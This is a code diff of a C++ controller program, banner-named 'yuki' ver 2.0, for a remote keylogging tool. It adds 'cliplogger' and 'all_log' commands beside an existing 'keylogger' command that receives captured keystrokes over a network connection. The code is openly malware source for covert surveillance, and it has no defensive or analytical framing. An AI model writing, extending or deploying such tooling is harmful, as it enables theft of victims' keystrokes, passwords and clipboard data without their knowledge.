@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <cstring>
 #include <string>
+#include <thread>
 
 #define BLUE     "\033[34m"
 #define GREEN    "\033[32m"
@@ -13,26 +14,33 @@
 
 void logo() {
     std::cout << "\x1b[2J\x1b[3J\x1b[H" << BLUE;
-    std::cout << "\t               _     _" << std::endl;
-    std::cout << "\t              | |   (_)" << std::endl;
-    std::cout << "\t _   _  _   _ | | __ _" << std::endl;
-    std::cout << "\t| | | || | | || |/ /| |" << std::endl;
-    std::cout << "\t| |_| || |_| ||   < | |" << std::endl;
-    std::cout << "\t \\__, | \\__,_||_|\\_\\|_|" << std::endl;
-    std::cout << "\t  __/ |" << std::endl;
-    std::cout << "\t |___/" << NC << std::endl;
+    std::cout << "\t                 _     _" << std::endl;
+    std::cout << "\t                | |   (_)" << std::endl;
+    std::cout << "\t   _   _  _   _ | | __ _" << std::endl;
+    std::cout << "\t  | | | || | | || |/ /| |" << std::endl;
+    std::cout << "\t  | |_| || |_| ||   < | |" << std::endl;
+    std::cout << "\t   \\__, | \\__,_||_|\\_\\|_|" << std::endl;
+    std::cout << "\t    __/ |" << std::endl;
+    std::cout << "\t   |___/" << NC << std::endl;
+    std::cout << GREEN << "\n\t\t[ ver 2.0 ]" << NC << std::endl;
     std::cout << "\nloading..." << std::endl;
 }
 
 int cmd(const char *str) {
     if (!strcmp(str, "pwd")) return 1;
     else if (!strcmp(str, "keylogger")) return 1;
+    else if (!strcmp(str, "cliplogger")) return 1;
+    else if (!strcmp(str, "all_log")) return 1;
+    else if (!strcmp(str, "!q")) return 1;
     else if (!strcmp(str, "help")) {
         std::cout << "Command List" << std::endl;
-        std::cout << "\tpwd       - view current directory" << std::endl;
-        std::cout << "\tkeylogger - get the characters you entered" << std::endl;
+        std::cout << "\tpwd        - view current directory" << std::endl;
+        std::cout << "\tkeylogger  - get the characters you entered" << std::endl;
+        std::cout << "\tcliplogger - clipboard monitoring" << std::endl;
+        std::cout << "\tall_log    - monitor almost all logs" << std::endl;
         return 2;
     }
+    else if (!strcmp(str, "")) return 2;
     return 0;
 }
 
@@ -93,6 +101,14 @@ int main() {
         if (!strcmp(send_buf, "!q")) break;
 
         if (!strcmp(send_buf, "keylogger")) {
+            std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
+            keylog(connect, recv_buf);
+        }
+        else if (!strcmp(send_buf, "cliplogger")) {
+            std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
+            keylog(connect, recv_buf);
+        }
+        else if (!strcmp(send_buf, "all_log")) {
             std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
             keylog(connect, recv_buf);
         }
